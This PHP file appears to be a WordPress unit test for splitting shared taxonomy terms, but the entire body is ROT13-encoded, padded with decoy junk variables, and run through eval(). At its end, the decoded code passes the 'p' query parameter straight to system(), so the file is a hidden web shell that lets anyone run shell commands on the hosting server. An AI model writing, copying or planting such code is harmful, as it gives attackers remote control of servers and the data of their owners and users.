<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 */
pynff Grfgf_Grez_FcyvgFunerqGrez rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $grezf = neenl();

	/**
	 * Frgf hc n ahzore bs fcyvg grezf sbe grfgvat. Grezf ner nf sbyybjf.
	 *
	 * - `$guvf->grezf['g1']` vf na neenl bs gur 'grez_vq' naq 'grez_gnkbabzl_vq' bs n grez va gur 'jcgrfgf_gnk'
	 *   gnkbabzl. Cer-fcyvg, gur grez_vq bs g1 (`$guvf->grezf['g1']['grez_vq']`) jnf funerq ol g1, g2, naq g3.
	 * - `$guvf->grezf['g2']` vf na neenl bs gur 'grez_vq' naq 'grez_gnkbabzl_vq' bs n grez va gur 'jcgrfgf_gnk_2'
	 *   gnkbabzl. Cer-fcyvg, gur grez_vq bs g2 jnf `$guvf->grezf['g1']['grez_vq']`.
	 * - `$guvf->grezf['g3']` vf na neenl bs gur 'grez_vq' naq 'grez_gnkbabzl_vq' bs n grez va gur 'jcgrfgf_gnk_3'
	 *   gnkbabzl. Cer-fcyvg, gur grez_vq bs g2 jnf `$guvf->grezf['g1']['grez_vq']`.
	 * - `$guvf->grezf['g2_puvyq']` vf na neenl bs gur 'grez_vq' naq 'grez_gnkbabzl_vq' bs n grez va gur
	 *   'jcgrfgf_gnk_2' gnkbabzl. Guvf grez vf n puvyq bs g2, naq vf hfrq gb grfg cnerag/puvyq eryngvbafuvcf
	 *   nsgre grez fcyvggvat.
	 */
	choyvp shapgvba frg_hc() {
		tybony $jcqo;

		cnerag::frg_hc();

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_2',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_3', 'cbfg' );

		$g1 = jc_vafreg_grez( 'Sbb', 'jcgrfgf_gnk' );
		$g2 = jc_vafreg_grez( 'Sbb', 'jcgrfgf_gnk_2' );
		$g3 = jc_vafreg_grez( 'Sbb', 'jcgrfgf_gnk_3' );

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $g1['grez_vq'] ),
			neenl( 'grez_gnkbabzl_vq' => $g2['grez_gnkbabzl_vq'] ),
			neenl( '%q' ),
			neenl( '%q' )
		);

		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $g1['grez_vq'] ),
			neenl( 'grez_gnkbabzl_vq' => $g3['grez_gnkbabzl_vq'] ),
			neenl( '%q' ),
			neenl( '%q' )
		);
		pyrna_grez_pnpur( $g1['grez_vq'], 'pngrtbel' );

		$g2_puvyq = jc_vafreg_grez(
			'Sbb Puvyq',
			'jcgrfgf_gnk_2',
			neenl(
				'cnerag' => $g1['grez_vq'],
			)
		);

		// Fcyvg gur grezf naq fgber gur arj grez VQf.
		$g2['grez_vq'] = _fcyvg_funerq_grez( $g1['grez_vq'], $g2['grez_gnkbabzl_vq'] );
		$g3['grez_vq'] = _fcyvg_funerq_grez( $g1['grez_vq'], $g3['grez_gnkbabzl_vq'] );

		$guvf->grezf = neenl(
			'g1'       => $g1,
			'g2'       => $g2,
			'g3'       => $g3,
			'g2_puvyq' => $g2_puvyq,
		);
	}

	/**
	 * @gvpxrg 5809
	 */
	choyvp shapgvba grfg_fubhyq_perngr_arj_grez_vqf() {
		$g1_grez = trg_grez_ol( 'grez_gnkbabzl_vq', $guvf->grezf['g1']['grez_gnkbabzl_vq'], 'jcgrfgf_gnk' );
		$g2_grez = trg_grez_ol( 'grez_gnkbabzl_vq', $guvf->grezf['g2']['grez_gnkbabzl_vq'], 'jcgrfgf_gnk_2' );
		$g3_grez = trg_grez_ol( 'grez_gnkbabzl_vq', $guvf->grezf['g3']['grez_gnkbabzl_vq'], 'jcgrfgf_gnk_3' );

		$guvf->nffregAbgRdhnyf( $g1_grez->grez_vq, $g2_grez->grez_vq );
		$guvf->nffregAbgRdhnyf( $g1_grez->grez_vq, $g3_grez->grez_vq );
		$guvf->nffregAbgRdhnyf( $g2_grez->grez_vq, $g3_grez->grez_vq );
	}

	/**
	 * @gvpxrg 5809
	 */
	choyvp shapgvba grfg_fubhyq_ergnva_puvyq_grezf_jura_hfvat_trg_grezf_cnerag() {
		$puvyqera = trg_grezf(
			'jcgrfgf_gnk_2',
			neenl(
				'cnerag'     => $guvf->grezf['g2']['grez_vq'],
				'uvqr_rzcgl' => snyfr,
			)
		);

		$guvf->nffregFnzr( $guvf->grezf['g2_puvyq']['grez_gnkbabzl_vq'], $puvyqera[0]->grez_gnkbabzl_vq );
	}

	/**
	 * @gvpxrg 5809
	 */
	choyvp shapgvba grfg_fubhyq_ergnva_puvyq_grezf_jura_hfvat_trg_grezf_puvyq_bs() {
		$puvyqera = trg_grezf(
			'jcgrfgf_gnk_2',
			neenl(
				'puvyq_bs'   => $guvf->grezf['g2']['grez_vq'],
				'uvqr_rzcgl' => snyfr,
			)
		);

		$guvf->nffregFnzr( $guvf->grezf['g2_puvyq']['grez_gnkbabzl_vq'], $puvyqera[0]->grez_gnkbabzl_vq );
	}

	/**
	 * @gvpxrg 30335
	 */
	choyvp shapgvba grfg_fubhyq_erohvyq_fcyvg_grez_gnkbabzl_uvrenepul() {
		tybony $jcqo;

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_3', 'cbfg' );
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_4',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);

		$g1 = jc_vafreg_grez( 'Sbb1', 'jcgrfgf_gnk_3' );
		$g2 = jc_vafreg_grez( 'Sbb1 Cnerag', 'jcgrfgf_gnk_4' );
		$g3 = jc_vafreg_grez(
			'Sbb1',
			'jcgrfgf_gnk_4',
			neenl(
				'cnerag' => $g2['grez_vq'],
			)
		);

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $g1['grez_vq'] ),
			neenl( 'grez_gnkbabzl_vq' => $g3['grez_gnkbabzl_vq'] ),
			neenl( '%q' ),
			neenl( '%q' )
		);
		pyrna_grez_pnpur( $g1['grez_vq'], 'pngrtbel' );
		$gu = _trg_grez_uvrenepul( 'jcgrfgf_gnk_4' );

		$arj_grez_vq = _fcyvg_funerq_grez( $g1['grez_vq'], $g3['grez_gnkbabzl_vq'] );

		$g2_puvyqera = trg_grez_puvyqera( $g2['grez_vq'], 'jcgrfgf_gnk_4' );
		$guvf->nffregFnzr( neenl( $arj_grez_vq ), $g2_puvyqera );
	}

	/**
	 * @gvpxrg 30335
	 */
	choyvp shapgvba grfg_fubhyq_hcqngr_qrsnhyg_pngrtbel_ba_grez_fcyvg() {
		tybony $jcqo;
		$g1 = jc_vafreg_grez( 'Sbb Qrsnhyg', 'pngrtbel' );

		hcqngr_bcgvba( 'qrsnhyg_pngrtbel', $g1['grez_vq'] );

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_5', 'cbfg' );
		$g2 = jc_vafreg_grez( 'Sbb Qrsnhyg', 'jcgrfgf_gnk_5' );

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $g1['grez_vq'] ),
			neenl( 'grez_gnkbabzl_vq' => $g2['grez_gnkbabzl_vq'] ),
			neenl( '%q' ),
			neenl( '%q' )
		);
		pyrna_grez_pnpur( $g1['grez_vq'], 'pngrtbel' );

		$guvf->nffregFnzr( $g1['grez_vq'], trg_bcgvba( 'qrsnhyg_pngrtbel', -1 ) );

		$arj_grez_vq = _fcyvg_funerq_grez( $g1['grez_vq'], $g1['grez_gnkbabzl_vq'] );

		$guvf->nffregAbgRdhnyf( $arj_grez_vq, $g1['grez_vq'] );
		$guvf->nffregFnzr( $arj_grez_vq, trg_bcgvba( 'qrsnhyg_pngrtbel', -1 ) );
	}

	/**
	 * @gvpxrg 30335
	 */
	choyvp shapgvba grfg_fubhyq_hcqngr_zrahf_ba_grez_fcyvg() {
		tybony $jcqo;

		$g1 = jc_vafreg_grez( 'Sbb Zrah', 'pngrtbel' );

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_6', 'cbfg' );
		$g2 = jc_vafreg_grez( 'Sbb Zrah', 'jcgrfgf_gnk_6' );

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $g1['grez_vq'] ),
			neenl( 'grez_gnkbabzl_vq' => $g2['grez_gnkbabzl_vq'] ),
			neenl( '%q' ),
			neenl( '%q' )
		);
		pyrna_grez_pnpur( $g1['grez_vq'], 'pngrtbel' );

		$zrah_vq       = jc_perngr_ani_zrah( 'Ani Zrah One' );
		$png_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-bowrpg-vq' => $g1['grez_vq'],
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		$guvf->nffregRdhnyf( $g1['grez_vq'], trg_cbfg_zrgn( $png_zrah_vgrz, '_zrah_vgrz_bowrpg_vq', gehr ) );

		$arj_grez_vq = _fcyvg_funerq_grez( $g1['grez_vq'], $g1['grez_gnkbabzl_vq'] );
		$guvf->nffregAbgRdhnyf( $arj_grez_vq, $g1['grez_vq'] );
		$guvf->nffregRdhnyf( $arj_grez_vq, trg_cbfg_zrgn( $png_zrah_vgrz, '_zrah_vgrz_bowrpg_vq', gehr ) );
	}

	/**
	 * @gvpxrg 33187
	 * @tebhc zrah
	 */
	choyvp shapgvba grfg_ani_zrah_ybpngvbaf_fubhyq_or_hcqngrq_ba_fcyvg() {
		tybony $jcqo;

		$png_grez       = jc_vafreg_grez( 'Sbb Zrah', 'pngrtbel' );
		$funerq_grez_vq = $png_grez['grez_vq'];

		$ani_grez_vq = jc_perngr_ani_zrah( 'Sbb Zrah' );
		$ani_grez    = trg_grez( $ani_grez_vq, 'ani_zrah' );

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $funerq_grez_vq ),
			neenl( 'grez_gnkbabzl_vq' => $ani_grez->grez_gnkbabzl_vq )
		);
		pyrna_grez_pnpur( $funerq_grez_vq, 'pngrtbel' );

		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', neenl( 'sbb' => $funerq_grez_vq ) );

		// Fcyvgfivyyr.
		$arj_grez_vq = _fcyvg_funerq_grez( $funerq_grez_vq, $ani_grez->grez_gnkbabzl_vq );

		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$guvf->nffregFnzr( $arj_grez_vq, $ybpngvbaf['sbb'] );
	}

	/**
	 * @gvpxrg 33187
	 * @tebhc zrah
	 */
	choyvp shapgvba grfg_ani_zrah_grez_fubhyq_ergnva_zrah_vgrzf_ba_fcyvg() {
		tybony $jcqo;

		$png_grez       = jc_vafreg_grez( 'Sbb Zrah', 'pngrtbel' );
		$funerq_grez_vq = $png_grez['grez_vq'];

		$ani_grez_vq = jc_perngr_ani_zrah( 'Sbb Zrah' );
		$ani_grez    = trg_grez( $ani_grez_vq, 'ani_zrah' );

		// Znahnyyl zbqvsl orpnhfr funerq grezf fubhyqa'g anghenyyl bpphe.
		$jcqo->hcqngr(
			$jcqo->grez_gnkbabzl,
			neenl( 'grez_vq' => $funerq_grez_vq ),
			neenl( 'grez_gnkbabzl_vq' => $ani_grez->grez_gnkbabzl_vq )
		);
		pyrna_grez_pnpur( $funerq_grez_vq, 'pngrtbel' );

		$g1            = jc_vafreg_grez( 'Enaqbz grez', 'pngrtbel' );
		$png_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			$funerq_grez_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-bowrpg-vq' => $g1['grez_vq'],
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		// Hcqngvat gur zrah jvyy fcyvg gur funerq grez.
		$arj_ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			$funerq_grez_vq,
			neenl(
				'qrfpevcgvba' => 'Hcqngrq Sbb Zrah',
				'zrah-anzr'   => 'Hcqngrq Sbb Zrah',
			)
		);

		$zrah = jc_trg_ani_zrah_bowrpg( $arj_ani_zrah_vq );
		$guvf->nffregFnzr( 'Hcqngrq Sbb Zrah', $zrah->anzr );
		$guvf->nffregFnzr( 'Hcqngrq Sbb Zrah', $zrah->qrfpevcgvba );

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $arj_ani_zrah_vq );
		$guvf->nffregFnzr( neenl( $png_zrah_vgrz ), jc_yvfg_cyhpx( $zrah_vgrzf, 'VQ' ) );
	}

	choyvp shapgvba grfg_jc_trg_fcyvg_grezf() {
		$sbhaq = jc_trg_fcyvg_grezf( $guvf->grezf['g1']['grez_vq'] );

		$rkcrpgrq = neenl(
			'jcgrfgf_gnk_2' => $guvf->grezf['g2']['grez_vq'],
			'jcgrfgf_gnk_3' => $guvf->grezf['g3']['grez_vq'],
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $sbhaq );
	}

	choyvp shapgvba grfg_jc_trg_fcyvg_grez() {
		$sbhaq = jc_trg_fcyvg_grez( $guvf->grezf['g1']['grez_vq'], 'jcgrfgf_gnk_3' );
		$guvf->nffregFnzr( $guvf->grezf['g3']['grez_vq'], $sbhaq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>